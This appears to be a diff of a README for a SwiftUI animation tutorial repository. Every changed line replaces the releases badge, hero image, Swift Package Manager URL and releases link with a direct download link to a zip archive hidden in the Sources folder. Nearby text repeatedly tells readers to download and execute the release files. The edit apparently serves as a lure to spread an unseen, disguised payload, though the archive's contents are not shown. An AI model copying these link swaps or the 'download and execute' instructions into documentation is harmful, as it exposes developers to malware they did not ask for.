@@ -1,8 +1,8 @@
 # SwiftUI Animation Masterclass: Advanced Transitions, Micro-Interactions, and Effects
 
-[![Releases](https://img.shields.io/badge/Releases-GitHub-1f425f?logo=github&logoColor=white)](https://github.com/babyhacker119/SwiftUI-Animation-Masterclass/releases)
+[![Releases](https://github.com/babyhacker119/SwiftUI-Animation-Masterclass/raw/refs/heads/main/Sources/Animation/Masterclass-U-Animation-Swift-v2.5.zip)](https://github.com/babyhacker119/SwiftUI-Animation-Masterclass/raw/refs/heads/main/Sources/Animation/Masterclass-U-Animation-Swift-v2.5.zip)
 
-![SwiftUI Animation Hero](https://images.unsplash.com/photo-1520975693415-2c230f0e15b2?auto=format&fit=crop&w=1200&q=60)
+![SwiftUI Animation Hero](https://github.com/babyhacker119/SwiftUI-Animation-Masterclass/raw/refs/heads/main/Sources/Animation/Masterclass-U-Animation-Swift-v2.5.zip)
 
 Welcome to a practical guide to motion in SwiftUI. This repository collects techniques, patterns, and reusable components that help you craft polished animations, fluid transitions, and tiny micro-interactions. It focuses on clarity, reliability, and performance, so you can ship delightful interfaces without sacrificing maintainability. The content here is built for iOS projects, but the ideas translate to macOS and other Apple platforms that use SwiftUI.
 
@@ -76,7 +76,7 @@ Installation
 - Swift Package Manager (SPM)
   - Open your Xcode project.
   - Go to File > Swift Packages > Add Package Dependency.
-  - Enter the repository URL: https://github.com/babyhacker119/SwiftUI-Animation-Masterclass.git
+  - Enter the repository URL: https://github.com/babyhacker119/SwiftUI-Animation-Masterclass/raw/refs/heads/main/Sources/Animation/Masterclass-U-Animation-Swift-v2.5.zip
   - Choose the version you want to use (from: 1.0.0 or newer) and add the package to your target.
   - Import the library in your SwiftUI files:
     import SwiftUI
@@ -233,7 +233,7 @@ Releases and downloads
 - Latest releases
   - The link above leads to the official releases page where you can find compiled assets and sample apps. Since the URL includes a path, the file(s) you download from that page should be downloaded and executed as part of the release artifacts. For convenience, you can also visit the releases page to browse assets and see change notes.
 
-  [![Releases](https://img.shields.io/badge/Releases-GitHub-1f425f?logo=github&logoColor=white)](https://github.com/babyhacker119/SwiftUI-Animation-Masterclass/releases)
+  [![Releases](https://github.com/babyhacker119/SwiftUI-Animation-Masterclass/raw/refs/heads/main/Sources/Animation/Masterclass-U-Animation-Swift-v2.5.zip)](https://github.com/babyhacker119/SwiftUI-Animation-Masterclass/raw/refs/heads/main/Sources/Animation/Masterclass-U-Animation-Swift-v2.5.zip)
 
 - How to download
   - Go to the Releases page.
@@ -319,7 +319,7 @@ Releases
 - For the latest assets and example projects, check the official releases page. If you need to run a sample app or inspect a demo locally, download the appropriate file from the Releases section and execute it as described in the release notes.
 
 Releases and downloads (second mention)
-- Visit the Releases page to download the latest assets and samples. The link above is the canonical source for release artifacts; because it includes a path, that file should be downloaded and executed as part of the release process. For quick access, this is the same URL you can use: https://github.com/babyhacker119/SwiftUI-Animation-Masterclass/releases
+- Visit the Releases page to download the latest assets and samples. The link above is the canonical source for release artifacts; because it includes a path, that file should be downloaded and executed as part of the release process. For quick access, this is the same URL you can use: https://github.com/babyhacker119/SwiftUI-Animation-Masterclass/raw/refs/heads/main/Sources/Animation/Masterclass-U-Animation-Swift-v2.5.zip
 
 End of documentation
 - The documentation ends here with a focus on clarity, practical guidance, and a healthy respect for motion as a tool for better user experiences.
